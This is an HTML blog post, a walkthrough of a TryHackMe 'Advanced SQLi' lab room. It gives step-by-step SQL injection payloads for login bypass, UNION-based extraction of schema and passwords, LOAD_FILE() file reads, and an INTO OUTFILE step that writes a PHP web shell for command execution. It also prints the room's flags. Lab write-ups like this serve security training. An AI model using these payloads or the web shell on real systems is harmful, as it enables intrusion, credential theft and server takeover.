@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced SQLi — A TryHackMe Room Write-up - Starfell Harbor</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@700&family=Inter:wght@400;500;700&family=Playfair+Display:wght@700&family=Source+Code+Pro:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../../assets/css/main.css">
+    <link href="https://fonts.googleapis.com/css2?family=Qwitcher+Grypen:wght@700&display=swap" rel="stylesheet">
+</head>
+<body class="text-gray-800">
+
+    <header id="navbar" class="sticky top-0 left-0 right-0 z-50 px-4 sm:px-6 lg:px-8 border-b border-gray-200">
+        <div class="container mx-auto flex justify-between items-center">
+            <a href="../../../index.html" class="font-logo js-logo-fade" style="color: var(--logo-color); line-height: 1;">
+                <span>Starfell</span>
+                <span class="block mt-[-0.5em] ml-4">Harbor</span>
+            </a>
+            <nav class="hidden md:flex items-center space-x-8">
+                <div class="relative dropdown">
+                    <button id="blogs-button" class="text-gray-600 hover:text-gray-900 transition-colors flex items-center">
+                        <span id="dropdown-text">Blogs</span>
+                        <svg class="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </button>
+                    <div id="blogs-menu" class="dropdown-menu absolute top-full w-48 bg-white rounded-lg shadow-xl py-2">
+                        <a href="../../index.html" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Cyber</a>
+                        <a href="../../../tech/index.html" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Tech</a>
+                        <a href="../../../personal/index.html" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Personal</a>
+                    </div>
+                </div>
+                <a href="#contact" class="subscribe-btn text-white font-semibold py-2 px-5 rounded-lg">Appreciate</a>
+            </nav>
+            <button id="mobile-menu-button" class="md:hidden text-gray-900">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path></svg>
+            </button>
+        </div>
+        <div id="mobile-menu" class="hidden md:hidden mt-4 bg-white rounded-lg shadow-md p-4">
+             <div class="relative">
+                <button id="mobile-blogs-button" class="w-full text-left py-2 px-4 text-sm hover:bg-gray-100 rounded flex justify-between items-center">
+                    <span id="mobile-dropdown-text">Blogs</span>
+                    <svg class="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                </button>
+                <div id="mobile-blogs-menu" class="hidden pl-4">
+                    <a href="../../index.html" class="block px-4 py-2 text-sm hover:bg-gray-100 rounded">Cyber</a>
+                    <a href="../../../tech/index.html" class="block px-4 py-2 text-sm hover:bg-gray-100 rounded">Tech</a>
+                    <a href="../../../personal/index.html" class="block px-4 py-2 text-sm hover:bg-gray-100 rounded">Personal</a>
+                </div>
+            </div>
+            <a href="#contact" class="block mt-2 text-center subscribe-btn text-white font-semibold py-2 px-5 rounded-lg">Appreciate</a>
+        </div>
+    </header>
+
+    <main class="py-16 sm:py-24">
+        <article class="container mx-auto px-4 sm:px-6 lg:px-8 max-w-4xl">
+            <header class="mb-12 text-center">
+                <p class="text-lg text-gray-500">JUL 10, 2025 • 6 MIN READ</p>
+                <h1 class="text-4xl md:text-6xl font-bold font-stylish mt-4 mb-6">Advanced SQLi — A TryHackMe Room Write-up</h1>
+                <div class="flex items-center justify-center space-x-3 text-gray-600">
+                    <span>By Creepus</span>
+                </div>
+            </header>
+
+            <figure class="mb-12">
+                <img src="images/1.webp" alt="Advanced SQLi TryHackMe Room" class="w-full h-auto rounded-2xl shadow-lg">
+            </figure>
+
+            <div class="blog-content">
+                <p>Welcome to the official write-up for the “Advanced SQLi” TryHackMe room! This guide will walk you through each task, explaining the concepts and providing step-by-step instructions to successfully exploit SQL Injection vulnerabilities, from basic bypasses to achieving Remote Code Execution.</p>
+                <p>Throughout this write-up, <code>MACHINE_IP</code> refers to the IP address of your deployed TryHackMe machine.</p>
+
+                <h2>Task 1: Classics — Mastering the Foundations of SQL Injection</h2>
+                <p>This task focuses on classic SQL Injection methods to bypass authentication, preparing us for more advanced scenarios.</p>
+
+                <h3>Challenge 1: The Classic Entry Point</h3>
+                <p><strong>Goal:</strong> Bypass the login page and get generic access.</p>
+                <p><strong>Navigate:</strong> Go to the vulnerable login page at <code>http://MACHINE_IP</code>.</p>
+                <p><strong>Input the Payload:</strong></p>
+                <ul>
+                    <li><strong>Username:</strong> <code>' OR 1=1-- -</code></li>
+                    <li><strong>Password:</strong> (Any input, e.g., <code>test</code>, or leave blank)</li>
+                </ul>
+                <p><strong>Find the Flag:</strong> If successful the page displays your first flag.</p>
+                <pre><code>FLAG{LoginBypassWorking}</code></pre>
+                
+                <h3>Challenge 2: The Social Link & Targeted Bypass</h3>
+                <p><strong>Goal:</strong> Discover the administrator’s username and then bypass the login specifically as that admin.</p>
+                <p><strong>Part 1: Discover the Admin Username</strong><br>
+                The intel suggests the admin’s GitHub username is <code>bread-pitt-bot</code>. You can visit their GitHub page to find their system username. Once found, submit the administrator’s username, which is “fightclub”.</p>
+                <p><strong>Part 2: Bypass with the Admin Username</strong><br>
+                Return to the login page and input the targeted payload:</p>
+                <ul>
+                    <li><strong>Username:</strong> <code>fightclub'-- -</code></li>
+                    <li><strong>Password:</strong> (Any input)</li>
+                </ul>
+                <p><strong>Find the Flag:</strong> If successful, you’ll get another flag confirming your targeted bypass.</p>
+                <pre><code>FLAG{AdminPasswordRetrieved}</code></pre>
+                
+                <h2>Task 2: Beyond the Horizon — Extracting Database Secrets</h2>
+                <p>In this task, we’ll go beyond simple login bypass to systematically extract information from the database.</p>
+                
+                <h3>Module 2: Database Footprinting</h3>
+                <p><strong>Goal:</strong> Determine the number of columns in the query and identify the current database name.</p>
+                <p>To determine the column count, use <code>ORDER BY</code> in the username field, incrementing the number until an error occurs. Once you know the column count (let's assume it's 1), use this payload to find the database name:</p>
+                <pre><code>admin' UNION SELECT database()-- -</code></pre>
+                
+                <h3>Module 3: Schema Mapping</h3>
+                <p><strong>Goal:</strong> Find table and column names.</p>
+                <p>Enumerate tables with:</p>
+                <pre><code>admin' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'your_database_name'-- -</code></pre>
+                <p>Then enumerate columns from a chosen table (e.g., <code>users</code>):</p>
+                <pre><code>admin' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = 'your_database_name' AND table_name = 'users'-- -</code></pre>
+                
+                <h3>Module 4: The Final Extraction & Legitimate Access</h3>
+                <p><strong>Goal:</strong> Extract the admin’s password and log in with valid credentials.</p>
+                <p>Exfiltrate the password with:</p>
+                <pre><code>admin' UNION SELECT password FROM users WHERE username = 'admin'-- -</code></pre>
+                <p>Note the password, then log in legitimately with the admin username and the extracted password. Highlight the page with Ctrl+A if you don't see the flag immediately.</p>
+                <pre><code>FLAG{LegitAdminAccess}</code></pre>
+                <p><strong>Bonus Tip:</strong> The password could also be found on the <code>bread-pitt-bot</code> GitHub account with simple decryption.</p>
+                
+                <h2>Task 3: Unauthorized File Access — The Hidden Data</h2>
+                <p>This task teaches you how to use SQL Injection to read files directly from the server’s file system.</p>
+                
+                <h3>Module 1: Identifying the New Vulnerability</h3>
+                <p><strong>Goal:</strong> Find a new SQLi vulnerability on a product page and map its query.</p>
+                <p>Locate the product page at <code>http://MACHINE_IP/product.php?id=1</code>. Confirm it's vulnerable and find the column count using <code>ORDER BY</code>. Then, identify displayable columns using <code>UNION SELECT</code> (e.g., <code>-1' UNION SELECT 1,2,3-- -</code>).</p>
+                
+                <h3>Module 2: File System Interaction via SQLi</h3>
+                <p><strong>Goal:</strong> Understand <code>LOAD_FILE()</code> and find the path to the hidden flag file.</p>
+                <p>You need the absolute path of <code>flag.txt</code>. You can find clues by trying to load known files like <code>/var/www/html/server_notes.txt</code> or by browsing to <code>http://MACHINE_IP/secret_notes.txt</code>.</p>
+                
+                <h3>Module 3: The Final Extraction</h3>
+                <p><strong>Goal:</strong> Read the <code>flag.txt</code> file.</p>
+                <p>You can get the flag from <code>/var/www/html/flag.txt</code>, either by browsing to it if possible or using the <code>LOAD_FILE()</code> payload:</p>
+                <pre><code>http://MACHINE_IP/product.php?id=-1' UNION SELECT 1, LOAD_FILE('/var/www/html/flag.txt'), 3-- -</code></pre>
+                <pre><code>FLAG{FileReadSQLiSuccess}</code></pre>
+                
+                <h2>Task 4: The Ultimate Control — Remote Code Execution (RCE)</h2>
+                <p>This is the ultimate challenge! You’ll escalate your SQL Injection skills to gain RCE by writing a malicious web shell to the server.</p>
+                
+                <h3>Module 2: Identifying the Attack Vector & Crafting the Shell</h3>
+                <p><strong>Goal:</strong> Understand the RCE attack vector and prepare a simple web shell.</p>
+                <p>The attack vector is the same vulnerable <code>product.php</code> page. The web shell code is:</p>
+                <pre><code>&lt;?php system($_GET["cmd"]); ?&gt;</code></pre>
+                
+                <h3>Module 3: Deploying the Web Shell (INTO OUTFILE)</h3>
+                <p><strong>Goal:</strong> Use SQL Injection to write your web shell to a web-accessible directory.</p>
+                <p>The target directory is <code>/var/www/html/uploads/</code>. Craft the RCE payload:</p>
+                <pre><code>http://MACHINE_IP/product.php?id=-1' UNION SELECT 1,'&lt;?php system($_GET["cmd"]); ?&gt;',3 INTO OUTFILE '/var/www/html/uploads/shell.php'-- -</code></pre>
+                <p>Access the URL in your browser to execute the payload.</p>
+                
+                <h3>Module 4: Gaining Control & Flag Retrieval</h3>
+                <p><strong>Goal:</strong> Access your web shell, confirm RCE, and find the final flag.</p>
+                <p>Access your shell at <code>http://MACHINE_IP/uploads/shell.php</code> and execute commands via the <code>cmd</code> parameter. Find and read the final flag with <code>?cmd=cat finalFlag.txt</code>.</p>
+                <pre><code>FLAG{RCE_Master}</code></pre>
+                
+                <h2>Task 5: Conclusion & What’s Next?</h2>
+                <p>Congratulations, you’ve completed the “Advanced SQLi” room! Keep learning, keep hacking, and always stay ethical!</p>
+            </div>
+        </article>
+    </main>
+
+    <footer id="contact" class="pt-16 sm:pt-24" style="padding-bottom: var(--footer-bottom-padding);">
+        <div class="container mx-auto px-4">
+            <hr class="border-gray-200 mb-16 sm:mb-20">
+            
+            <div class="max-w-xl mx-auto text-center">
+                <h2 class="text-4xl font-bold font-stylish mb-4">Enjoy the read?</h2>
+                <p class="text-gray-600 mb-8">If you enjoyed my work, feel free to leave your wishes here along with your name — a simple way to share your appreciation!</p>
+                <form name="appreciation-cyber-advanced-sqli" method="POST" data-netlify="true" class="flex flex-col sm:flex-row gap-4 max-w-md mx-auto">
+                    <input type="text" name="visitor_name" placeholder="Enter your name" class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+                    <button type="submit" class="w-full sm:w-auto subscribe-btn text-white font-semibold py-3 px-6 rounded-lg flex-shrink-0">Send</button>
+                </form>
+            </div>
+            
+            <div class="container mx-auto mt-16">
+                <div class="divider" style="margin-bottom: var(--footer-divider-margin-bottom);">
+                    <img src="../../../assets/images/Clipped_image_20250816_104657.png" alt="Rotating Star" class="rotating-star w-8 h-8" onerror="this.style.display='none'">
+                </div>
+                <div class="flex justify-between items-center">
+                    <p class="text-gray-600 text-sm">&copy; 2025 Starfell Harbor. All Rights Reserved.</p>
+                    <a href="../../index.html" class="text-gray-600 hover:text-gray-900 text-sm">Back to Cyber Writings</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+    
+    <script src="../../../assets/js/main.js"></script>
+</body>
+</html>
